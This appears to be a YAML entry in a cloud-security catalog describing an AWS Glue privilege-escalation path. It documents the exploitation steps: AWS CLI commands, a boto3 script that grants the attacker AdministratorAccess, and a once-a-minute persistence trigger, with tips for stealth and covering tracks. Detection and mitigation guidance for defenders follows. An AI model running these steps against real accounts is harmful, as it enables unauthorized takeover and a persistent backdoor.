id: "glue-006"
name: "iam:PassRole + glue:UpdateJob + glue:CreateTrigger"
category: "service-passrole"
services:
  - iam
  - glue

permissions:
  required:
    - permission: "iam:PassRole"
      resourceConstraints: "Must be able to pass a role to glue.amazonaws.com"
    - permission: "glue:UpdateJob"
      resourceConstraints: "Must be able to update existing Glue job configurations"
    - permission: "glue:CreateTrigger"
      resourceConstraints: "Must be able to create Glue triggers with --start-on-creation flag"
  additional:
    - permission: "glue:GetJob"
      resourceConstraints: "Helpful for retrieving current job configuration before modification"
    - permission: "glue:ListJobs"
      resourceConstraints: "Useful for discovering existing Glue jobs that can be modified"
    - permission: "glue:GetTrigger"
      resourceConstraints: "Helpful for monitoring trigger state and activation status"
    - permission: "glue:GetJobRun"
      resourceConstraints: "Useful for monitoring job execution details"
    - permission: "glue:GetJobRuns"
      resourceConstraints: "Helpful for listing job runs to track execution history"
    - permission: "iam:ListRoles"
      resourceConstraints: "Useful for discovering available privileged roles to pass"
    - permission: "iam:GetRole"
      resourceConstraints: "Helpful for viewing role trust policies and attached permissions"

description: A principal with `iam:PassRole`, `glue:UpdateJob`, and `glue:CreateTrigger` can modify an existing AWS Glue job to use an administrative role and execute malicious code, then establish a scheduled trigger for persistent automated execution. This scenario demonstrates a stealthy privilege escalation vulnerability that combines the stealth of updating existing infrastructure with the persistence of scheduled automation. Unlike `glue:CreateJob` which creates new resources that may raise alerts, `glue:UpdateJob` modifies existing infrastructure, making detection significantly more difficult. Organizations commonly have dozens or hundreds of Glue jobs running legitimate data pipelines, and updating existing jobs is a common maintenance activity. When an attacker updates an existing job's execution role and script location, then creates a trigger with the `--start-on-creation` flag, they establish automated privilege escalation that executes on a schedule (e.g., every minute). The update-based approach with persistence is particularly dangerous because it blends into normal operations while creating a persistent backdoor. The attacker modifies an existing job to use a privileged role and malicious script, creates a scheduled trigger that immediately activates, and the trigger automatically executes the job which runs Python code that modifies IAM permissions to grant the starting principal administrative access. The trigger continues to run on schedule, re-granting access even if remediated.

prerequisites:
  admin:
    - "An existing Glue job must be present in the environment that can be modified"
    - "A role must exist that trusts glue.amazonaws.com to assume it"
    - "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
  lateral:
    - "An existing Glue job must be present in the environment that can be modified"
    - "A role must exist that trusts glue.amazonaws.com to assume it"
    - "The role's permissions determine the level of access gained"

limitations: |
  This path requires a pre-existing Glue job to modify, unlike glue:CreateJob which can be executed in any environment. The path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available in the environment, you gain access limited to those role's permissions. However, even limited access may enable multi-hop attacks or access to sensitive data. The level of access depends entirely on the permissions of the role that can be passed to the Glue service. The persistent nature of triggers means access can be re-granted even after remediation attempts if the trigger is not identified and removed. This technique is harder to detect than CreateJob because job updates are routine operational activities that blend in with normal maintenance.

exploitationSteps:
  awscli:
    - step: 1
      command: |
        # List existing Glue jobs to find one to modify
        aws glue list-jobs --region us-east-1
      description: "Discover existing Glue jobs in the environment. Choose a job that you have permission to update. Jobs that run infrequently or are not actively monitored are ideal targets for stealth."

    - step: 2
      command: |
        # View current job configuration
        aws glue get-job \
          --region us-east-1 \
          --job-name existing-job-name \
          --query 'Job.{Role: Role, Script: Command.ScriptLocation}'
      description: "Retrieve the current job configuration to see its existing role and script location. Document these values if you need to restore the job after the attack to cover your tracks."

    - step: 3
      command: |
        # Create Python script that attaches admin policy (upload to S3)
        # Example script content:
        import boto3
        iam = boto3.client('iam')
        iam.attach_user_policy(
            UserName='target-username',
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
      description: "Prepare a Python script that will attach AdministratorAccess policy to your starting principal. Upload this script to an S3 bucket that the Glue job can access."

    - step: 4
      command: |
        aws glue update-job \
          --region us-east-1 \
          --job-name existing-job-name \
          --job-update "Role=arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE,Command={Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9}"
      description: "Update the existing Glue job to use the privileged role and point to your malicious script. The Role parameter uses iam:PassRole to assign the administrative role. The ScriptLocation is changed to your escalation script. This modification blends in with normal maintenance activities."

    - step: 5
      command: |
        aws glue create-trigger \
          --region us-east-1 \
          --name privesc-trigger \
          --type SCHEDULED \
          --start-on-creation \
          --schedule "cron(0/1 * * * ? *)" \
          --actions '[{"JobName": "existing-job-name"}]'
      description: "Create a scheduled trigger with --start-on-creation flag for the modified job. This immediately activates the trigger and schedules the job to run every minute. The trigger will fire at the next scheduled time and execute the malicious job automatically without requiring glue:StartJobRun permission."

    - step: 6
      command: |
        # Wait 1-3 minutes for trigger to fire and job to complete
        aws glue get-trigger \
          --region us-east-1 \
          --name privesc-trigger \
          --query 'Trigger.State'
      description: "Verify the trigger state shows ACTIVATED. Scheduled triggers fire at the next scheduled time (every minute in this case). Wait for the job to execute automatically."

    - step: 7
      command: |
        aws glue get-job-runs \
          --region us-east-1 \
          --job-name existing-job-name \
          --max-results 1 \
          --query 'JobRuns[0].JobRunState'
      description: "Check the latest job run to confirm it has executed. Wait for JobRunState to show SUCCEEDED, indicating your script has completed and administrative access has been granted."

    - step: 8
      command: |
        # Wait 15 seconds for IAM policy propagation
        sleep 15
        # Verify admin access
        aws iam list-users
      description: "After the job completes and IAM changes propagate, verify that you now have administrative permissions. Note that the trigger will continue to run every minute, re-granting access even if it's removed, establishing persistent administrative access."

recommendation: |
  **Restrict PassRole permissions:** Never grant `iam:PassRole` with wildcards. Use resource-based conditions to limit which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::*:role/approved-glue-roles-*",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "glue.amazonaws.com"
      }
    }
  }
  ```

  **Implement SCPs to prevent privilege escalation:** Use Service Control Policies to deny PassRole on administrative roles to Glue services:

  ```json
  {
    "Effect": "Deny",
    "Action": "iam:PassRole",
    "Resource": [
      "arn:aws:iam::*:role/*admin*",
      "arn:aws:iam::*:role/*Admin*"
    ],
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "glue.amazonaws.com"
      }
    }
  }
  ```

  **Monitor CloudTrail for Glue job updates and trigger creation:** Alert on `UpdateJob` and `CreateTrigger` API calls, especially when:
  - The execution role is changed to a more privileged role
  - Script location is modified to point to external or suspicious buckets
  - Combined with PassRole on privileged roles
  - Triggers are created with `StartOnCreation=true` immediately after job updates
  - Execution intervals are suspiciously frequent (every minute)
  - Jobs are updated by users who don't typically work with Glue

  **Restrict glue:UpdateJob and glue:CreateTrigger permissions:** Only grant these permissions to users who legitimately need to modify ETL workflows (data engineers, DevOps). Consider these actions more sensitive than read-only Glue permissions.

  **Separate CreateJob and UpdateJob permissions:** Grant `glue:CreateJob` and `glue:UpdateJob` to different personas when possible. Implement approval workflows for job configuration changes.

  **Implement configuration baselines:** Use AWS Config rules to track approved configurations for each Glue job and alert on role ARN changes, script location changes, or jobs running with administrative policies.

  **Limit trigger scheduling frequencies:** Implement organizational policies or SCPs that prevent creation of triggers with very frequent schedules (e.g., every minute), as these are often indicators of abuse rather than legitimate ETL workflows.

  **Monitor IAM policy changes from Glue service principal:** Set up CloudWatch alarms for IAM policy modifications (`AttachUserPolicy`, `AttachRolePolicy`, `PutUserPolicy`, `PutRolePolicy`) where the source is the Glue service principal.

  **Implement change detection:** Use AWS Config or third-party tools to detect when Glue job configurations change and alert when job role ARN or script location changes.

  **Use IAM Access Analyzer:** Enable IAM Access Analyzer to automatically detect privilege escalation paths involving PassRole and Glue services. Review findings regularly and remediate identified risks.

  **Implement least privilege for Glue roles:** When creating IAM roles for Glue services, grant only the minimum permissions required for the specific ETL tasks. Avoid using administrative policies like `AdministratorAccess`. Typical Glue jobs need S3, Glue Data Catalog, and CloudWatch Logs accessâ€”not IAM permissions.

discoveredBy:
  name: "Carlos Polop"
  organization: "HackTricks"
  date: "Unknown"

references:
  - title: "HackTricks - AWS Glue Privilege Escalation"
    url: "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-glue-privesc/index.html"
  - title: "Rhino Security Labs - CloudGoat Glue_privesc Walkthrough"
    url: "https://rhinosecuritylabs.com/cloud-security/cloudgoat-walkthrough-glue_privesc/"
  - title: "CloudGoat - glue_privesc Scenario"
    url: "https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/cloudgoat/scenarios/aws/glue_privesc"
  - title: "AWS Glue UpdateJob API Documentation"
    url: "https://docs.aws.amazon.com/glue/latest/webapi/API_UpdateJob.html"
  - title: "AWS Glue CreateTrigger API Documentation"
    url: "https://docs.aws.amazon.com/glue/latest/webapi/API_CreateTrigger.html"
  - title: "AWS IAM PassRole Documentation"
    url: "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html"

relatedPaths:
  - "glue-001"
  - "glue-002"
  - "glue-003"
  - "glue-004"
  - "glue-005"
  - "lambda-001"
  - "ec2-001"

toolSupport:
  pmapper: false
  iamVulnerable: false
  pacu: false
  prowler: false

attackVisualization:
  nodes:
    - id: start
      label: Starting Principal
      type: principal
      description: |
        The principal with `iam:PassRole`, `glue:UpdateJob`, and `glue:CreateTrigger` permissions. Can be an IAM user or role.

        This principal can modify existing Glue jobs, pass IAM roles to them, and create scheduled triggers for automated execution. This combination provides both **stealth** (modifying existing infrastructure) and **persistence** (automated recurring execution).

    - id: existing_job
      label: Existing Glue Job
      type: resource
      description: |
        A pre-existing AWS Glue job already deployed in the environment. This job is part of normal production infrastructure running legitimate ETL workloads.

        **Stealth Factor**: The attacker modifies this existing job rather than creating a new suspicious resource. The update changes:
        - **Role**: From non-privileged service role to privileged target role (via iam:PassRole)
        - **Script**: From benign production script to malicious escalation script

        **Persistence Factor**: After updating the job, the attacker creates a scheduled trigger that automatically executes it every minute.

        ```bash
        # Update the job
        aws glue update-job \
          --job-name existing-job-name \
          --job-update "Role=arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE,Command={Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9}"

        # Create trigger for persistence
        aws glue create-trigger \
          --name privesc-trigger \
          --type SCHEDULED \
          --start-on-creation \
          --schedule "cron(0/1 * * * ? *)" \
          --actions '[{"JobName": "existing-job-name"}]'
        ```

        UpdateJob events are common in production and blend in with normal maintenance activities. The trigger makes this attack persistent.

    - id: target_role
      label: Existing Role That Trusts the glue Service
      type: resource
      description: |
        The privileged IAM role that is passed to the Glue job during the update. This role must have a trust policy allowing glue.amazonaws.com to assume it.

        When the updated job runs (triggered automatically every minute), it assumes this role and receives temporary credentials. The permissions of this role determine what the malicious script can accomplish.

    - id: execute_code
      label: Execute Code with Target Role Permissions
      type: action
      description: |
        The scheduled trigger fires automatically (every minute) and starts the modified job. No manual `glue:StartJobRun` is needed.

        The job executes in the AWS Glue managed environment with the target role's credentials. The malicious Python script runs repeatedly on each trigger activation:

        ```python
        import boto3
        iam = boto3.client('iam')
        iam.attach_user_policy(
            UserName='starting-principal',
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        ```

        **Combined Stealth + Persistence**: The job looks like normal production infrastructure executing on schedule, making this attack particularly difficult to detect. Even if the policy attachment is removed, it will be re-applied when the trigger fires again.

    - id: admin
      label: Effective Administrator + Persistent Backdoor
      type: outcome
      description: |
        The target role has administrative permissions (e.g., AdministratorAccess or iam:* permissions). The Python script successfully uses these permissions to attach the AdministratorAccess policy to the starting principal.

        **Persistence**: The trigger continues to fire every minute, re-granting administrative access even if the policy attachment is manually removed. This creates a persistent backdoor that is difficult to remediate without identifying and deleting both the trigger and restoring the job configuration.

        **Stealth**: The attack uses existing infrastructure (modified job) rather than creating new resources, blending in with normal operations.

    - id: some_perms
      label: Some Additional Access + Persistence
      type: outcome
      color: '#ffeb99'
      description: |
        The target role has some elevated permissions but not full IAM write access. The script may gain access to:
        - Sensitive data in S3, databases, or other AWS services
        - Secrets in AWS Secrets Manager or Parameter Store
        - Multi-hop privilege escalation opportunities

        **Persistence**: The trigger continues to fire every minute, repeatedly performing these actions on schedule.

    - id: no_perms
      label: No Additional Access
      type: outcome
      color: '#cccccc'
      description: |
        The target role has only minimal permissions (e.g., basic Glue service permissions). The script cannot perform meaningful privilege escalation.

        However, the trigger continues to fire every minute, consuming resources and demonstrating a security gap.

  edges:
    - from: start
      to: existing_job
      label: glue:UpdateJob + glue:CreateTrigger
      description: |
        The starting principal uses `glue:UpdateJob` to modify an existing Glue job, changing its execution role (via `iam:PassRole`) and script location to point to a malicious Python script. Then uses `glue:CreateTrigger` with `--start-on-creation` to create a scheduled trigger that fires every minute.

        This is a **combined stealth + persistence technique**:
        - **Stealth**: Modifies existing infrastructure rather than creating new resources; UpdateJob events are routine in production
        - **Persistence**: Scheduled trigger automatically executes the job every minute without manual intervention
        - Job executions look like normal operational activity

    - from: existing_job
      to: target_role
      label: Job assumes passed role
      description: |
        When the trigger fires and the job starts executing, it automatically assumes the target role that was passed during the update. The Glue service requests temporary credentials from AWS STS for this role.

        The job now has all the permissions granted to the target role.

    - from: target_role
      to: execute_code
      label: Script executes with role permissions
      description: |
        The malicious Python script executes in the Glue job environment with the temporary credentials from the target role. The script uses boto3 to interact with AWS APIs and attempt privilege escalation.

        This happens **repeatedly every minute** as the trigger continues to fire, providing persistence.

    - from: execute_code
      to: admin
      label: If role has IAM write permissions
      branch: A
      condition: admin
      description: |
        If the target role has AdministratorAccess or `iam:AttachUserPolicy` permission, the script successfully attaches the AdministratorAccess policy to the starting principal.

        The trigger continues to fire every minute, making this a **persistent backdoor** that re-grants admin access even if manually removed.

    - from: execute_code
      to: some_perms
      label: If role has some elevated permissions
      branch: B
      condition: some_permissions
      description: |
        If the target role has elevated permissions but not IAM write access, the attacker gains partial access such as reading sensitive data or accessing other AWS services.

        The trigger provides persistence, repeatedly performing these actions every minute.

    - from: execute_code
      to: no_perms
      label: If role has minimal permissions
      branch: C
      condition: no_permissions
      description: |
        If the target role only has basic Glue service permissions, the script cannot perform meaningful privilege escalation.

        However, the trigger continues firing every minute, demonstrating a security gap.
